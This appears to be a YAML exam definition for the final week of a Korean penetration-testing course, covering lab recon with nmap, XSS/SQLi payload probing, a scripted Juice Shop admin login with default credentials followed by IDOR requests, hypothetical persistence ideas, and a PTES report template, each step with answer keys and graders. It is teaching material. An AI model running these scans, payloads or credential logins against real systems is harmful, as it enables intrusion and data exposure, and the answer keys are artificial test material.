lab_id: standalone-attack-week15
title: 기말 — PTES 7 단계 종합 침투 + 보고서 (180분, 100점)
version: standalone-non-ai
course: attack
week: 15
description: |
  PTES 7 단계 종합 시험. 5 단계 (Recon / Vuln Analysis / Exploit / Post Exploit /
  Reporting) × 20점.
difficulty: hard
duration_minutes: 180
prerequisites: [W14]
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 단계 1 (20점) — Recon

      attacker 에서 6v6 의 핵심 자산 nmap + nikto 정찰.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker 'nmap -sT -p 22,80,443,2204,9100 10.20.30.1 2>&1 | tail -10'
      ssh 6v6-attacker 'nmap -sn 10.20.30.0/24 2>&1 | tail -10'
      ```

      ## 📋 평가 (각 5점)

      1. fw 5 port scan
      2. subnet ping sweep
      3. 자산 표 (host + port + service)
      4. ATT&CK 매핑 (T1595)
    hint: nmap recon
    category: exam
    points: 20
    answer: |
      ssh -n 6v6-attacker 'nmap -sT -p 22,80,443,9100 10.20.30.1 2>&1 | tail -10'
      ssh -n 6v6-attacker 'nmap -sn 10.20.30.0/24 2>&1 | tail -10'
    answer_detail: Recon nmap.
    verify:
      type: output_contains
      expect: open
      field: stdout
      semantic:
        intent: Recon
        success_criteria: [open port]
        acceptable_methods: ["**[OSS] ATT&CK T1595 Active Scanning**"]
    target_vm: attacker

  - order: 2
    instruction: |
      ## 🎯 단계 2 (20점) — Vuln Analysis

      8 vuln 사이트의 XSS / SQLi 페이로드 매트릭스.

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      for h in juice dvwa neobank govportal mediforum admin; do
        for p in "?q=<script>" "?q=1+OR+1=1"; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $h.6v6.lab" "http://10.20.30.1/$p")
          echo "$h $p: $code"
        done
      done
      '
      ```

      ## 📋 평가

      1. 6 × 2 매트릭스 = 12 응답
      2. ModSec 403 비율 분석
      3. CVSS 점수 매핑
      4. CWE Top 25 매핑
    hint: 6 사이트 × 2 payload
    category: exam
    points: 20
    answer: |
      ssh -n 6v6-attacker '
      for h in juice dvwa neobank govportal mediforum admin; do
        for p in "?q=<script>" "?q=1+OR+1=1"; do
          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $h.6v6.lab" "http://10.20.30.1/$p")
          echo "$h $p: $code"
        done
      done
      '
    answer_detail: Vuln 매트릭스.
    verify:
      type: output_contains
      expect: '403'
      field: stdout
      semantic:
        intent: Vuln scan
        success_criteria: [매트릭스]
        acceptable_methods: ["**[OSS] OWASP Top 10 + CWE Top 25**"]
    target_vm: attacker

  - order: 3
    instruction: |
      ## 🎯 단계 3 (30점) — Exploitation (3 vuln)

      SQLi + XSS + IDOR 3 vuln 실 exploit + 차단/우회 분석. IDOR 는 **JWT 획득
      필수** (W08 흐름 응용).

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker '
      echo "=== 1. SQLi ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
      echo "=== 2. XSS ==="
      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>"
      echo "=== 3. IDOR (JWT 획득 후) ==="
      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
      echo "token len: ${#TOK}"
      for id in 1 2 3; do
        curl -s -o /dev/null -w "user $id (Bearer): %{http_code}\n" -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id"
      done
      '
      ```

      ## 📋 평가 (각 5점)

      1. 3 vuln 실 exploit 시도 + 응답 코드 매트릭스
      2. ModSec 차단 (SQLi 403 / XSS 403) 분석
      3. JWT 획득 → IDOR 200 + admin role 권한 분리 결함 인지
      4. 우회 가능성 평가 (tamper / encoding / nested)
      5. 영향 분석 (CIA 3 축)
      6. 운영 권장 (ModSec + JWT 검증 + RBAC)
    hint: 3 vuln + JWT 후 IDOR
    category: exam
    points: 30
    answer: |
      ssh -n 6v6-attacker '
      curl -s -o /dev/null -w "SQLi: %{http_code}\n" -H "Host: dvwa.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
      curl -s -o /dev/null -w "XSS: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>"
      TOK=$(curl -s -X POST -H "Content-Type: application/json" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/user/login" -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}" | python3 -c "import sys,json;print(json.load(sys.stdin)[\"authentication\"][\"token\"])")
      for id in 1 2 3; do
        curl -s -o /dev/null -w "user $id: %{http_code}\n" -H "Host: juice.6v6.lab" -H "Authorization: Bearer $TOK" "http://10.20.30.1/api/Users/$id"
      done
      '
    answer_detail: |
      3 exploit + JWT 흐름 응용 IDOR. SQLi/XSS 403 (ModSec 차단) + IDOR 200 (admin
      token 후 user PII 노출).
    verify:
      type: output_contains
      expect: user
      field: stdout
      semantic:
        intent: Exploit
        success_criteria: [3 vuln]
        acceptable_methods: ["**[OSS] T1190 + T1078 매핑**"]
    target_vm: attacker

  - order: 4
    instruction: |
      ## 🎯 단계 4 (10점) — Post Exploit

      권한 상승 + 지속성 가설 (실 적용 X — 시뮬).

      ## 💻 산출물

      ```markdown
      # Post Exploit 가설
      ## 권한 상승 시나리오 (W11)
      - sudo NOPASSWD 활용
      - SUID find → root shell
      - cron job 변조
      ## 지속성 시나리오 (W12) — 실 적용 X
      - SSH key 추가 시뮬
      - .bashrc backdoor 시뮬
      ```
    hint: 권한 상승 + 지속성 가설
    category: exam
    points: 10
    answer: |
      echo "가설 시뮬 시나리오: APT 의 권한 상승 + 측면 이동 + 데이터 유출 → 5 Round"
      echo "권한 상승 → SUID → Lateral → C2 → Impact (5 Round 시나리오)"
    answer_detail: Post Exploit 가설.
    verify:
      type: output_contains
      expect: 권한
      field: stdout
      semantic:
        intent: Post Exploit
        success_criteria: [가설]
        acceptable_methods: ["**[OSS] T1548 / T1543 매핑**"]
    target_vm: attacker

  - order: 5
    instruction: |
      ## 🎯 단계 5 (20점) — Reporting (PTES 보고서)

      PTES 7 섹션 표준 보고서.

      ## 💻 산출물

      ```markdown
      # K-Education 6v6 침투 테스트 보고서 (W15 기말, 학번)

      ## 1. Executive Summary
      high 0 / medium 5 / low 12 발견.

      ## 2. Methodology
      PTES 7 단계 + MITRE ATT&CK + OWASP Top 10.

      ## 3. Findings
      | ID | 취약점 | CVSS | CWE | 영향 |
      | F1 | XSS | 6.1 | CWE-79 | cookie 도용 |
      | F2 | SQLi (low) | 9.8 | CWE-89 | 데이터 유출 |
      | F3 | IDOR | 8.2 | CWE-639 | 권한 우회 |
      | F4 | Path Traversal | 7.5 | CWE-22 | 파일 노출 |
      | F5 | JWT alg=none | 9.1 | CWE-287 | 인증 우회 |

      ## 4. Technical Details
      각 F1-F5 의 실 payload + 응답 + reproduction.

      ## 5. Recommendations
      1. ModSec paranoia 2 상승
      2. JWT alg whitelist
      3. IDOR 권한 검증
      4. Path traversal input validation
      5. WAF + IDS 통합 alert (W14 Purple)

      ## 6. Appendix
      nmap / sqlmap / Burp HTML output.
      ```
    hint: PTES 7 섹션 보고서
    category: exam
    points: 20
    answer: |
      echo "위 형식 = PTES 7 단계 매핑 보고서 (Pre-engagement / Intel / ThreatModel / VulnAnalysis / Exploit / PostExploit / Reporting)"
      echo "PTES Reporting: Executive Summary + Technical Findings + Risk Matrix + 권고"
    answer_detail: PTES 표준 보고서.
    verify:
      type: output_contains
      expect: PTES
      field: stdout
      semantic:
        intent: PTES 보고서
        success_criteria: [7 섹션]
        acceptable_methods: ["**[관리적]** PTES + ATT&CK + ISMS-P 매핑"]
    target_vm: attacker

  # ============================================================
  # STEP 6 — R/B/P 종합 (기말 PTES 7 단계)
  # ============================================================
  - order: 6
    instruction: |
      ## 🎯 MISSION (R/B/P) — 기말 PTES 7 단계 R/B/P 답안 표준

      각 finding 의 PTES 7 단계 × R/B/P (Red 30 + Blue 30 + Purple 30 = 90 /
      finding × 6 = 540 → 환산 100 점).

      ## 📖 시나리오 상세

      ### 🔴 Red Team — 기말 PTES 7 단계 의 종합 침투

      **페르소나**: 기말 응시자 = pen-tester simulation. 6 finding × PTES 7 단계 의
      표준 실행. resume 의 PTES 보고서 의 base.

      **공격 의도** (PTES 단계 별):
      1. Pre-engagement (RoE 명시)
      2. Intelligence (nmap + nikto)
      3. Threat Modeling (STRIDE)
      4. Vuln Analysis (6 finding CVSS)
      5. Exploitation (실 exploit)
      6. Post-Exploitation (가설 영향)
      7. Reporting (3 청자)

      ### 🔵 Blue Team — 14 weeks 의 통합 detection

      **탐지 source**:
      - ModSec CRS 의 14 weeks 의 통합
      - Wazuh + Suricata 의 통합 alert
      - audit log 의 forensic

      ### 🟣 Purple Team — 3 청자 + 5 영역 self-assess

      **답안 형식** (per finding):
      - R 30 + B 30 + P 30 = 90 점
      - 6 finding × 90 = 540 점 → 환산 100

      ## 💻 markdown
      ```bash
      cat << 'EOF' > /tmp/attack_final_rbp.md
      # 기말 PTES 7 × R/B/P
      Stage 1 Pre-engagement: RoE 명시 + scope 동의
      Stage 2 Intelligence: nmap + nikto + ffuf
      Stage 3 Threat Modeling: STRIDE 6
      Stage 4 Vuln Analysis: 6 finding CVSS + CWE + ATT&CK
      Stage 5 Exploitation: 3 vhost 실 exploit + Blue audit
      Stage 6 Post-Exploit: 영향 가설 + Purple 차단 권장
      Stage 7 Reporting: 3 청자 (임원/운영/분석)
      EOF
      echo "Coverage: PTES 7 × R/B/P × 6 finding × 3 청자"
      ```
    hint: 'PTES 7 × R/B/P answer'
    category: rbp_integration
    points: 6
    answer: |
      cat << 'EOF' > /tmp/attack_final_rbp.md
      # 기말 PTES 7 × R/B/P
      7 stage × R/B/P × 6 finding × 3 청자
      EOF
      echo "Coverage: PTES 7 × R/B/P × 6 finding × 3 청자"
    answer_detail: 기말 PTES R/B/P 답안
    verify:
      type: output_contains
      expect: 'Coverage'
      field: stdout
      semantic:
        intent: 기말 PTES R/B/P
        success_criteria: [7 stage, 6 finding, Coverage]
        acceptable_methods: ["**[관리적] markdown PTES**"]
    target_vm: bastion
